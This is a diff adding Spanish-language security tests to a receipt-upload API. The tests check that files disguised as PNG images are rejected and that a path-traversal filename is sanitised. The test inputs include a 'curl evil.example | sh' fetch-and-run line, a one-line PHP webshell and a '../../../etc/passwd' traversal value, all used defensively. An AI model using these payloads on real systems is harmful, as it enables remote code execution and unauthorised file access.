@@ -214,3 +214,66 @@ async def test_el_proveedor_por_defecto_no_da_nada_por_bueno(client, session, se
     assert receipt.reconciliation_status is ReconciliationStatus.UNREADABLE
     payment = await session.scalar(select(Payment).where(Payment.reference == referencia))
     assert payment.status is not PaymentStatus.SUCCEEDED
+
+
+# --- SEC-01: contenido falsificado por la API -------------------------------
+
+@pytest.mark.parametrize(
+    ("contenido", "ataque"),
+    [
+        (b"MZ\x90\x00\x03\x00\x00\x00", "ejecutable de Windows"),
+        (b"\x7fELF\x02\x01\x01\x00", "binario ELF"),
+        (b"#!/bin/sh\ncurl evil.example | sh", "script de shell"),
+        (b"<?php system($_GET['cmd']); ?>", "webshell PHP"),
+        (b"PK\x03\x04\x14\x00", "archivo ZIP"),
+    ],
+)
+async def test_un_fichero_disfrazado_de_imagen_se_rechaza(client, contenido, ataque):
+    """Declarar `image/png` no basta: se miran los bytes reales."""
+    respuesta = await client.post(
+        "/api/v1/receipts",
+        files={"file": ("inocente.png", contenido, "image/png")},
+        headers=AUTH_HEADERS,
+    )
+    assert respuesta.status_code == 422, f"se coló un {ataque}"
+    assert "no corresponde con el tipo declarado" in respuesta.json()["message"]
+
+
+async def test_un_png_declarado_como_pdf_se_rechaza(client):
+    respuesta = await client.post(
+        "/api/v1/receipts",
+        files={"file": ("r.pdf", PNG_1PX, "application/pdf")},
+        headers=AUTH_HEADERS,
+    )
+    assert respuesta.status_code == 422
+
+
+async def test_un_pdf_legitimo_se_acepta(client):
+    pdf = b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\ntrailer\n%%EOF\n"
+    respuesta = await client.post(
+        "/api/v1/receipts",
+        files={"file": ("comprobante.pdf", pdf, "application/pdf")},
+        headers=AUTH_HEADERS,
+    )
+    assert respuesta.status_code == 202
+
+
+# --- SEC-02: nombre de fichero con escape de directorio ---------------------
+
+async def test_un_nombre_con_escape_de_directorio_se_sanea(client, session):
+    """El nombre llega del cliente: no puede decidir dónde se escribe."""
+    import uuid as _uuid
+
+    from app.db.models import Receipt
+
+    respuesta = await client.post(
+        "/api/v1/receipts",
+        files={"file": ("../../../etc/passwd.png", PNG_1PX, "image/png")},
+        headers=AUTH_HEADERS,
+    )
+    assert respuesta.status_code == 202
+
+    receipt = await session.get(Receipt, _uuid.UUID(respuesta.json()["id"]))
+    assert receipt.filename == "passwd.png"
+    assert ".." not in receipt.storage_uri
+    assert "/etc/" not in receipt.storage_uri
